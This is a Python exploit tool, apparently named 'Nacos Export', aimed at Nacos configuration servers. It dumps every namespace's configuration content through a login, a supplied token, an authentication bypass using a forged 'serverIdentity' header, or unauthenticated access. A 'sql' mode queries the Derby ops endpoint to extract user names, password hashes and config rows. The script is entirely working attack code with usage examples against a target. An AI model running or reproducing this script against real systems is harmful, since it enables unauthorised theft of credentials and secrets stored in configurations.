import requests
import sys
import urllib3
urllib3.disable_warnings()


PROXY = {
    # "http": "127.0.0.1:8080"
}

HEADER = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
}

def login(target: str, username: str, password: str) -> str:
    token = None
    login_1 = "/v1/auth/users/login"
    login_2 = "/v1/auth/login"

    login_params = {
        'username': username,
        'password': password,
        'namespaceId': ''
    }

    try:
        resp = requests.post(target + login_1, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
        resp_json = resp.json()
        token = resp_json.get("accessToken")
        if token == None:
            resp = requests.post(target + login_2, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
            token = resp.headers.get("Authorization")
    except Exception:
        pass
    if token == None:
        print("[!] login failed.")
        exit(0)
    else:
        print("[+] Tokne: {}".format(token))
        return token

def get_namespaces(target: str, token: str) -> list:
    path = "/v1/console/namespaces"
    url = target + path
    if token != "":
        HEADER["Authorization"] = token
    params = {
        'namespaceId': '',
    }
    resp = requests.get(url, headers=HEADER, params=params, proxies=PROXY, verify=False)
    if resp.status_code == 200:
        resp_dict = resp.json()
        return resp_dict['data']

def print_output(namespace: str, group:str, dataId: str, content: str):
    print("""

##################################################
[+] Namespace: {namespace}
[+] Group: {group}
[+] DataId: {dataid}
##################################################
""".format(namespace=namespace, group=group, dataid=dataId ))
    print(content, "\n")

def dump_config_content(target: str, token: str):
    namespaces = get_namespaces(target, token)
    count = 0
    path = "/v1/cs/configs"
    for namespace in namespaces:
        params = {
            "search": "accurate",
            "dataId": "",
            "group": "",
            "appName": "",
            "config_tags": "",
            "pageNo": 1,
            "pageSize": namespace["configCount"],
            "tenant": namespace["namespace"],
            "namespaceId": ""
        }
        # bypass
        if token == "":
            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
            if resp.status_code == 200:
                resp_json = resp.json()
                for item in resp_json['pageItems']:
                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
                    count = count + 1
            else:
                HEADER['serverIdentity'] = "security"
                resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
                if resp.status_code == 200:
                    resp_json = resp.json()
                    for item in resp_json['pageItems']:
                        print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
                        count = count + 1
        else:
            HEADER["Accesstoken"] = token
            params["accessToken"] = token
            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
            if resp.status_code == 200:
                resp_json = resp.json()
                for item in resp_json["pageItems"]:
                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
                    count = count + 1
    
    print("[+] Count: ", count)

def dump_sql(target):
    # dbs_query = "select * from sys.sysschemas"
    # users_query = "select * from nacos.users"
    # content_query = "select * from nacos.config_info"

    count = 0
    path = "/v1/cs/ops/derby"
    p1 = {"sql": "select * from nacos.users"}
    resp = requests.get(target + path, headers=HEADER,  params=p1, verify=False)
    if resp.status_code == 200:
        resp_json = resp.json()
        if resp_json["code"] == 200:
            print("[+] USERS:")
            for user in resp_json["data"]:
                print("User: ", user["USERNAME"])
                print("Pass: ", user["PASSWORD"])
                print("")

    p2 = {"sql": "select * from nacos.config_info"}
    resp = requests.get(target + path, headers=HEADER, params=p2, verify=False)
    if resp.status_code == 200:
        resp_json = resp.json()
        if resp_json["code"] == 200:
            for content in resp_json["data"]:
                print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                count = count + 1
    print("[+] Count: ", count)
            
        

def usage(name: str):
    ver = "v1.1.1"
    print("""
 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: {version}
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |         
                ||     ||

Usage:
    python3 {script} <URL> <USERNAME> <PASSWORD>
    python3 {script} <URL> <TOKEN>
    python3 {script} <URL> bypass|unauth
    python3 {script} <URL> sql

Example:
    python3 {script} http://TARGET:8848/nacos nacos nacos
    python3 {script} http://TARGET:8848/nacos eyJhbGciOiJIXXXXXXXXXXXX
    python3 {script} http://TARGET:8848/nacos unauth
    python3 {script} http://TARGET:8848/nacos sql
""".format(script=name, version=ver))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv[0])
        exit(0)

    target = sys.argv[1].rstrip('/')
    print("[+] Target: ", target)
    token = ""
    if len(sys.argv) == 4:
        print("[+] Username: ", sys.argv[2])
        print("[+] Password: ", sys.argv[3])
        print("\n")
        token = login(target, sys.argv[2], sys.argv[3])
        dump_config_content(target, token)
    elif len(sys.argv) == 3:
        if sys.argv[2] == "bypass" or sys.argv[2] == "unauth":
            print("[*] Bypass/Unauth")
            dump_config_content(target, "")
        elif sys.argv[2] == "sql":
            dump_sql(target)
        else:
            print("[+] Token: ", sys.argv[2])
            print("\n")
            token = sys.argv[2]
            dump_config_content(target, token)